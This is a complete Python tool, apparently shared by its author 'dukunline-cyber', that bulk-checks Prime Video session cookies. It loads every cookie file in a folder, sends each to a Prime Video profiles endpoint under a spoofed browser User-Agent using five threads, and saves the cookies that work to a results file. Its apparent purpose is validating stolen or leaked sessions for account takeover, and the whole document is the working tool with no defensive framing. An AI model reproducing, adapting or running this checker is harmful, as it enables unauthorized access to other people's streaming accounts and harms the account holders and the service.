import requests
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BANNER = """
╔══════════════════════════════════════════╗
║   Prime Video Cookie Checker v1.0       ║
║   by: dukunline-cyber                   ║
╚══════════════════════════════════════════╝
"""

def check_cookie(cookie_file):
    try:
        with open(cookie_file, 'r') as f:
            cookies = f.read().strip()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Cookie': cookies
        }
        
        r = requests.get('https://www.primevideo.com/api/getProfiles', headers=headers, timeout=15)
        
        if r.status_code == 200 and 'profiles' in r.text.lower():
            return cookie_file, 'VALID'
        else:
            return cookie_file, 'INVALID'
    except Exception as e:
        return cookie_file, f'ERROR: {str(e)}'

def main():
    print(BANNER)
    
    cookie_dir = input('[?] Folder cookies (default: ./cookies): ').strip() or './cookies'
    
    if not os.path.isdir(cookie_dir):
        print(f'[!] Folder {cookie_dir} tidak ditemukan!')
        sys.exit(1)
    
    cookie_files = [os.path.join(cookie_dir, f) for f in os.listdir(cookie_dir) if f.endswith('.txt')]
    
    if not cookie_files:
        print('[!] Tidak ada file .txt di folder cookies!')
        sys.exit(1)
    
    print(f'[*] Ditemukan {len(cookie_files)} cookie files')
    print('[*] Mulai checking...\n')
    
    valid = 0
    invalid = 0
    
    os.makedirs('results', exist_ok=True)
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_cookie, cf): cf for cf in cookie_files}
        for future in as_completed(futures):
            filename, status = future.result()
            if status == 'VALID':
                valid += 1
                print(f'  [✓] {os.path.basename(filename)} - VALID')
                with open('results/valid.txt', 'a') as f:
                    with open(filename, 'r') as cf:
                        f.write(f'=== {os.path.basename(filename)} ===\n{cf.read()}\n\n')
            else:
                invalid += 1
                print(f'  [✗] {os.path.basename(filename)} - {status}')
    
    print(f'\n[*] Selesai! Valid: {valid} | Invalid: {invalid}')
    print(f'[*] Hasil valid disimpan di results/valid.txt')

if __name__ == '__main__':
    main()
